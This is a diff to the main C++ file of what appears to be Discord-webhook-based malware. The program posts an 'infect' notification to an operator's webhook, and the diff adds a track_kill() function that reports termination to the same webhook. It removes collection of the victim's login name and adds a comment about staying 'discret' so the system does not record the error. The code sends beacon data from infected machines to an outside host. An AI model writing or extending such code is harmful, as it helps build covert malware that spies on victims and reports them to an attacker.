@@ -1,7 +1,18 @@
 #include "header.h"
 #include "embeds/handling/handling.h"
 
-//Returning 0 in error cases are for a specific condition, please avoid changing it.
+//Returning 0 in error cases are for a specific condition (avoid system recollect information about the supposed error), please avoid changing it if you want to be discret.
+
+void track_kill(dpp::cluster& temp_token, dpp::webhook& MAIN_WEBHOOK) {
+    //dpp::cluster* myArg1 = static_cast<int>(temp_token);
+    //dpp::webhook* myArg2 = static_cast<int>(MAIN_WEBHOOK);
+    dpp::message proc_kill("");
+    proc_kill.add_embed(handle_kill());
+    std::this_thread::sleep_for(std::chrono::seconds(1));
+    temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(proc_kill));
+
+    //exit(0);
+}
 
 int main() {
     dotenv::init();
@@ -10,10 +21,8 @@ int main() {
     dpp::webhook MAIN_WEBHOOK(MAIN_WEBHOOK_url);
 
     try {
-        char* system_username = getlogin();
-        std::string formated_username(system_username);
         dpp::message infect("");
-        infect.add_embed(making_connection(formated_username));
+        infect.add_embed(making_connection());
 
         temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(infect));
 
@@ -37,5 +46,6 @@ int main() {
         temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(exception_error));
     }
 
+    track_kill(temp_token, MAIN_WEBHOOK);
     return 0;
 }
